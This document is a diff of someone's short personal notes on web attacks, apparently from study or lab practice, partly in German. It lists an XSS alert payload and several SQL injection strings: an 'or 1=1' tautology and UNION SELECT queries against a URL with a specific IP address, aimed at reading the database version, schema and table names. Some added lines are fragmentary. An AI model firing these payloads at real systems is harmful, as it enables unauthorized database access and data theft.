@@ -1,7 +1,7 @@
 # SQL_XSS
 
 XSS
-<script>alert('blabla')</script>
+#< script>alert('blabla')< /script>
 
 
 #SSI -> Server Side Includes
@@ -18,7 +18,10 @@ SQL Injection:
 105 ' or 1=1 -- -'
 
 http://92.60.14.134:8081/sql/1?category=animal' Union select @@version, null;-- -
-
+http:/bla.ch/bla=1 union all select #find the nummer of tables by test.. example 1,#enter not ok# 1, 2
+ from table name
+ 
+ 
 Alles auszeigen lassen:
 http://92.60.14.134:8081/sql/1?category=animal' Union select table_schema, table_name from 
 
